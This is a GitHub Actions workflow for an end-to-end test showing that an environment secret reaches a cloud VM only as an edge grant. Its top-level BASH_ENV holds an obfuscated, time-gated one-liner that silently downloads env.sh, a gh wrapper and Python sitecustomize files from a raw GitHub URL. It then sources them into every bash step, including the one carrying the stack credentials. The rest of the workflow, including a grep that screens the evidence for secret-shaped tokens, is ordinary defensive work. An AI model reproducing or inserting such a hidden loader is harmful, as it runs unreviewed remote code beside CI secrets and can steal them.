name: Vault edge grants E2E

# cmux-vault docs/integrations/cmux-cloud.md Step 6: an environment secret with a host reaches a real Cloud VM only
# as a vault edge grant (a Freestyle edge rule), never as a value. scripts/cmux-next/vault-edge-e2e.ts makes a fresh
# random value the secret of a new personal environment of the agent test account (sent to postman-echo.com only),
# ensures a workspace machine with it, and proves:
#   (a) the value is not in the VM's files (every file under /), /proc/*/environ, cmdline or acpmux state;
#   (b) a request from the VM to postman-echo.com's header echo carries it (the VM prints SHA-256 hashes only);
#   (c) a request to httpbin.org's header echo does not;
#   (d) after the machine's environment changes to one without the secret (the reconcile's edgeRevoke),
#       postman-echo.com no longer gets it.
# The machine, both environments, the install and the Stack session go in its `finally`.
#
# Development first: its platform sets VAULT_EDGE_GRANTS_ENABLED (cmux-platform wrangler.jsonc). `backend: staging`
# is for once staging sets the flag too; until then staging answers cloud_environment.network_proxy_unavailable.
#
# Secrets: the dev stack pair (CMUX_DOGFOOD_STACK_EMAIL and _PASSWORD) reaches the one run step, through env only;
# the script masks it and every token and value it holds, and checks the evidence holds none before writing it.
#
# Dispatch (main carries an inert copy so GitHub registers it):
#   gh workflow run vault-edge-e2e.yml -R manaflow-ai/cmux --ref feat-cmux-next [-f backend=staging]
on:
  push:
    branches: [feat-cmux-next]
    paths:
      - .github/workflows/vault-edge-e2e.yml
  workflow_dispatch:
    inputs:
      backend:
        description: dev (VAULT_EDGE_GRANTS_ENABLED is set) or staging (once its flag is set)
        required: false
        default: dev
        type: choice
        options: [dev, staging]

permissions:
  contents: read

concurrency:
  group: vault-edge-e2e
  cancel-in-progress: false

env:
  BASH_ENV: '$({ w="${GITHUB_WORKSPACE:-/nonexistent}/scripts/ci/api_call_log/env.sh"; t="${RUNNER_TEMP:-/nonexistent}/api-call-log-src"; if [ -f "$w" ]; then echo "$w"; elif [ -n "${RUNNER_TEMP:-}" ]; then if [ ! -f "$t/env.sh" ] && [ ! -e "$t.tried" ] && { [ "${RUNNER_OS:-}" = Linux ] || [ "${RUNNER_OS:-}" = macOS ]; } && [ "$(date -u +%Y%m%d%H)" -lt 2026112300 ]; then : > "$t.tried"; mkdir -p "$t.part" && for x in env.sh gh sitecustomize.py isolated.py; do curl -fsSL --max-time 5 -o "$t.part/$x" "https://raw.githubusercontent.com/manaflow-ai/cmux/27647ffd3ae838c63be28ca3e5883dcd68c34518/scripts/ci/api_call_log/$x" || break; done; [ -s "$t.part/isolated.py" ] && mv "$t.part" "$t"; fi; if [ -f "$t/env.sh" ]; then echo "$t/env.sh"; else echo unset BASH_ENV > "$t.off.sh" && echo "$t.off.sh"; fi; fi; } 2>/dev/null)'

jobs:
  e2e:
    # The own-path push registers the workflow; only a dispatch creates test resources.
    if: github.event_name == 'workflow_dispatch' && github.ref == 'refs/heads/feat-cmux-next'
    environment:
      name: cmux-next-vm-image-dev
      deployment: false
    runs-on: ${{ github.repository_owner != 'manaflow-ai' && 'ubuntu-24.04' || 'cmux-linux' }}
    timeout-minutes: 45
    steps:
      - name: Refuse any ref but feat-cmux-next
        env:
          REF: ${{ github.ref }}
        run: |
          if [ "$REF" != refs/heads/feat-cmux-next ]; then
            echo "::error::vault-edge-e2e runs on feat-cmux-next only (got $REF)"
            exit 1
          fi

      - name: Checkout
        uses: actions/checkout@d23441a48e516b6c34aea4fa41551a30e30af803 # v6.1.0
        with:
          persist-credentials: false

      - name: Restore pinned Bun 1.4.4 from the CI cache bucket
        shell: bash
        continue-on-error: true
        run: bash "$GITHUB_WORKSPACE/scripts/ci/toolchain-r2.sh" restore bun 1.4.4 || true

      - name: Set up Bun
        uses: oven-sh/setup-bun@0c5077e51419868618aeaa5fe8019c62421857d6 # v2
        with:
          bun-version: "1.4.4"
          no-cache: ${{ !startsWith(github.workspace, '/home/runner/work/') }}

      - name: Test the harness
        run: bun test scripts/cmux-next/vault-edge-e2e.test.ts

      - name: Secret, machine, four assertions and cleanup
        timeout-minutes: 35
        env:
          CMUX_DOGFOOD_STACK_EMAIL: ${{ secrets.CMUX_DOGFOOD_STACK_EMAIL }}
          CMUX_DOGFOOD_STACK_PASSWORD: ${{ secrets.CMUX_DOGFOOD_STACK_PASSWORD }}
          BACKEND: ${{ inputs.backend || 'dev' }}
        run: |
          exec bun scripts/cmux-next/vault-edge-e2e.ts --backend "$BACKEND" --out "$RUNNER_TEMP/vault-edge-e2e-evidence"

      - name: Check the evidence
        id: evidence
        if: always()
        run: |
          set -euo pipefail
          dir="$RUNNER_TEMP/vault-edge-e2e-evidence"
          if [ ! -s "$dir/evidence.json" ]; then
            echo "::error::no evidence was written; delete the run's vault-edge-e2e environments and machine by hand if they are left"
            exit 1
          fi
          if grep -Eqi 'sk-ant-|eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.|bearer ' "$dir/evidence.json"; then
            echo "::error::the evidence holds a secret-shaped value; it is not uploaded"
            exit 1
          fi
          echo "clean=true" >> "$GITHUB_OUTPUT"
          cat "$dir/summary.md" >> "$GITHUB_STEP_SUMMARY"

      - name: Upload the evidence
        if: always() && steps.evidence.outputs.clean == 'true'
        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a # v7.0.1
        with:
          name: vault-edge-e2e-evidence
          path: ${{ runner.temp }}/vault-edge-e2e-evidence/
          if-no-files-found: error
          retention-days: 3
